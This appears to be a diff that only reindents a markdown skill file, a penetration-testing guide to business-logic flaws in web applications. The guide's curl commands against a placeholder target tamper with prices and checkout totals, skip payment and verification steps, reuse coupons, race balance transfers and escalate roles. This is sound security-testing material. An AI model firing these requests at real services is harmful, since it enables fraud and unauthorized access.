@@ -1,10 +1,10 @@
 ---
 name: testing-for-business-logic-vulnerabilities
 description: Manually identifies flaws in application business logic - price manipulation,
-  multi-step workflow bypass, and privilege escalation - by intercepting and modifying
-  requests with Burp Suite, going beyond what automated vulnerability scanners detect.
-  Use for e-commerce checkout/cart flows, voucher and rewards systems, or any assessment
-  where scanners find little but business rules need scrutiny.
+ multi-step workflow bypass, and privilege escalation - by intercepting and modifying
+ requests with Burp Suite, going beyond what automated vulnerability scanners detect.
+ Use for e-commerce checkout/cart flows, voucher and rewards systems, or any assessment
+ where scanners find little but business rules need scrutiny.
 domain: cybersecurity
 subdomain: web-application-security
 tags:
@@ -58,26 +58,26 @@ Document all critical business processes and their expected constraints.
 ```
 # Critical business flows to map:
 # 1. Registration/Onboarding flow
-#    - Email verification requirements
-#    - Account approval process
-#    - Role assignment logic
+# - Email verification requirements
+# - Account approval process
+# - Role assignment logic
 
 # 2. E-commerce/Purchase flow
-#    - Product selection → Cart → Checkout → Payment → Confirmation
-#    - Price calculation logic
-#    - Discount/coupon application
-#    - Quantity limits
-#    - Shipping cost calculation
+# - Product selection → Cart → Checkout → Payment → Confirmation
+# - Price calculation logic
+# - Discount/coupon application
+# - Quantity limits
+# - Shipping cost calculation
 
 # 3. Authentication/Authorization flow
-#    - Login → MFA → Dashboard
-#    - Password reset → Token → New password
-#    - Role escalation/approval
+# - Login → MFA → Dashboard
+# - Password reset → Token → New password
+# - Role escalation/approval
 
 # 4. Financial transactions
-#    - Balance check → Transfer → Confirmation
-#    - Withdrawal limits
-#    - Currency conversion
+# - Balance check → Transfer → Confirmation
+# - Withdrawal limits
+# - Currency conversion
 
 # Document expected constraints:
 # - Minimum order amounts
@@ -95,46 +95,46 @@ Intercept and modify price, quantity, and total values in requests.
 ```bash
 # Test negative quantity
 curl -s -X POST \
-  -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"product_id": 1, "quantity": -1, "price": 99.99}' \
-  "https://target.example.com/api/cart/add"
+ -H "Authorization: Bearer $TOKEN" \
+ -H "Content-Type: application/json" \
+ -d '{"product_id": 1, "quantity": -1, "price": 99.99}' \
+ "https://target.example.com/api/cart/add"
 
 # Test zero price
 curl -s -X POST \
-  -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"product_id": 1, "quantity": 1, "price": 0}' \
-  "https://target.example.com/api/cart/add"
+ -H "Authorization: Bearer $TOKEN" \
+ -H "Content-Type: application/json" \
+ -d '{"product_id": 1, "quantity": 1, "price": 0}' \
+ "https://target.example.com/api/cart/add"
 
 # Test extremely large quantity
 curl -s -X POST \
-  -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"product_id": 1, "quantity": 999999999}' \
-  "https://target.example.com/api/cart/add"
+ -H "Authorization: Bearer $TOKEN" \
+ -H "Content-Type: application/json" \
+ -d '{"product_id": 1, "quantity": 999999999}' \
+ "https://target.example.com/api/cart/add"
 
 # Test decimal/float manipulation
 curl -s -X POST \
-  -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"product_id": 1, "quantity": 0.001, "price": 0.01}' \
-  "https://target.example.com/api/cart/add"
+ -H "Authorization: Bearer $TOKEN" \
+ -H "Content-Type: application/json" \
+ -d '{"product_id": 1, "quantity": 0.001, "price": 0.01}' \
+ "https://target.example.com/api/cart/add"
 
 # Test integer overflow
 curl -s -X POST \
-  -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"product_id": 1, "quantity": 2147483647}' \
-  "https://target.example.com/api/cart/add"
+ -H "Authorization: Bearer $TOKEN" \
+ -H "Content-Type: application/json" \
+ -d '{"product_id": 1, "quantity": 2147483647}' \
+ "https://target.example.com/api/cart/add"
 
 # Modify total amount directly in checkout request
 # Intercept in Burp and change total from 299.99 to 0.01
 curl -s -X POST \
-  -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"cart_id": "abc123", "total": 0.01, "payment_method": "card"}' \
-  "https://target.example.com/api/checkout"
+ -H "Authorization: Bearer $TOKEN" \
+ -H "Content-Type: application/json" \
+ -d '{"cart_id": "abc123", "total": 0.01, "payment_method": "card"}' \
+ "https://target.example.com/api/checkout"
 ```
 
 ### Step 3: Test Workflow Step Bypass
@@ -146,16 +146,16 @@ Attempt to skip required steps in multi-step processes.
 # Instead of: Register → Verify email → Access dashboard
 # Try: Register → Access dashboard directly
 curl -s -H "Authorization: Bearer $UNVERIFIED_TOKEN" \
-  "https://target.example.com/api/dashboard"
+ "https://target.example.com/api/dashboard"
 
 # Skip payment step
 # Instead of: Cart → Shipping → Payment → Confirmation
 # Try: Cart → Confirmation (skip payment)
 curl -s -X POST \
-  -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"cart_id": "abc123", "shipping_address": "123 Main St"}' \
-  "https://target.example.com/api/orders/confirm"
+ -H "Authorization: Bearer $TOKEN" \
+ -H "Content-Type: application/json" \
+ -d '{"cart_id": "abc123", "shipping_address": "123 Main St"}' \
+ "https://target.example.com/api/orders/confirm"
 
 # Skip MFA step
 # Instead of: Login → MFA → Dashboard
@@ -169,12 +169,12 @@ curl -s -X POST \
 # Repeat a step that should be one-time
 # Apply same coupon code multiple times
 for i in $(seq 1 5); do
-  curl -s -X POST \
-    -H "Authorization: Bearer $TOKEN" \
-    -H "Content-Type: application/json" \
-    -d '{"coupon_code": "DISCOUNT50"}' \
-    "https://target.example.com/api/cart/apply-coupon"
-  echo "Attempt $i"
+ curl -s -X POST \
+ -H "Authorization: Bearer $TOKEN" \
+ -H "Content-Type: application/json" \
+ -d '{"coupon_code": "DISCOUNT50"}' \
+ "https://target.example.com/api/cart/apply-coupon"
+ echo "Attempt $i"
 done
 ```
 
@@ -186,27 +186,27 @@ Exploit timing windows in concurrent request processing.
 # Race condition on coupon application
 # Send multiple identical requests simultaneously
 for i in $(seq 1 10); do
-  curl -s -X POST \
-    -H "Authorization: Bearer $TOKEN" \
-    -H "Content-Type: application/json" \
-    -d '{"coupon_code": "ONETIME50"}' \
-    "https://target.example.com/api/cart/apply-coupon" &
+ curl -s -X POST \
+ -H "Authorization: Bearer $TOKEN" \
+ -H "Content-Type: application/json" \
+ -d '{"coupon_code": "ONETIME50"}' \
+ "https://target.example.com/api/cart/apply-coupon" &
 done
 wait
 
 # Race condition on balance transfer
 # If user has $100, try to transfer $100 to two accounts simultaneously
 curl -s -X POST \
-  -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"to": "user_b", "amount": 100}' \
-  "https://target.example.com/api/transfer" &
+ -H "Authorization: Bearer $TOKEN" \
+ -H "Content-Type: application/json" \
+ -d '{"to": "user_b", "amount": 100}' \
+ "https://target.example.com/api/transfer" &
 
 curl -s -X POST \
-  -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"to": "user_c", "amount": 100}' \
-  "https://target.example.com/api/transfer" &
+ -H "Authorization: Bearer $TOKEN" \
+ -H "Content-Type: application/json" \
+ -d '{"to": "user_c", "amount": 100}' \
+ "https://target.example.com/api/transfer" &
 wait
 
 # Race condition on reward claiming
@@ -224,20 +224,20 @@ Find ways to exploit promotional features and reward mechanisms.
 ```bash
 # Self-referral: refer your own email
 curl -s -X POST \
-  -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"referral_email": "myown@email.com"}' \
-  "https://target.example.com/api/referrals/invite"
+ -H "Authorization: Bearer $TOKEN" \
+ -H "Content-Type: application/json" \
+ -d '{"referral_email": "myown@email.com"}' \
+ "https://target.example.com/api/referrals/invite"
 
 # Referral code reuse across multiple accounts
 # Create multiple accounts and use same referral code
 
 # Coupon stacking: apply multiple discount codes
 curl -s -X POST \
-  -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"coupon_codes": ["SAVE10", "WELCOME20", "VIP50"]}' \
-  "https://target.example.com/api/cart/apply-coupons"
+ -H "Authorization: Bearer $TOKEN" \
+ -H "Content-Type: application/json" \
+ -d '{"coupon_codes": ["SAVE10", "WELCOME20", "VIP50"]}' \
+ "https://target.example.com/api/cart/apply-coupons"
 
 # Abuse free trial: re-register with same details
 # Test if email+1@domain.com or email@domain.com bypass duplicate detection
@@ -249,8 +249,8 @@ curl -s -X POST \
 # Test reward point manipulation
 # Earn points on order → Cancel order → Keep points
 curl -s -X POST \
-  -H "Authorization: Bearer $TOKEN" \
-  "https://target.example.com/api/orders/12345/cancel"
+ -H "Authorization: Bearer $TOKEN" \
+ "https://target.example.com/api/orders/12345/cancel"
 # Check if reward points from order 12345 were revoked
 ```
 
@@ -261,17 +261,17 @@ Assess authorization logic for privilege escalation through business processes.
 ```bash
 # Role escalation via registration parameter
 curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -d '{"email":"test@test.com","password":"Test1234!","role":"admin"}' \
-  "https://target.example.com/api/auth/register"
+ -H "Content-Type: application/json" \
+ -d '{"email":"test@test.com","password":"Test1234!","role":"admin"}' \
+ "https://target.example.com/api/auth/register"
 
 # Organization tenant boundary testing
 # User in Org A tries to access Org B resources via business workflows
 curl -s -X POST \
-  -H "Authorization: Bearer $TOKEN_ORG_A" \
-  -H "Content-Type: application/json" \
-  -d '{"org_id": "org_b_id", "action": "view_reports"}' \
-  "https://target.example.com/api/reports"
+ -H "Authorization: Bearer $TOKEN_ORG_A" \
+ -H "Content-Type: application/json" \
+ -d '{"org_id": "org_b_id", "action": "view_reports"}' \
+ "https://target.example.com/api/reports"
 
 # Test for privilege retention after role downgrade
 # Admin → Regular user: can they still access admin functions?
@@ -280,10 +280,10 @@ curl -s -X POST \
 # Test invitation/delegation abuse
 # Invite user with higher privileges than inviter has
 curl -s -X POST \
-  -H "Authorization: Bearer $REGULAR_TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"email":"new@test.com","role":"admin"}' \
-  "https://target.example.com/api/users/invite"
+ -H "Authorization: Bearer $REGULAR_TOKEN" \
+ -H "Content-Type: application/json" \
+ -d '{"email":"new@test.com","role":"admin"}' \
+ "https://target.example.com/api/users/invite"
 ```
 
 ## Key Concepts
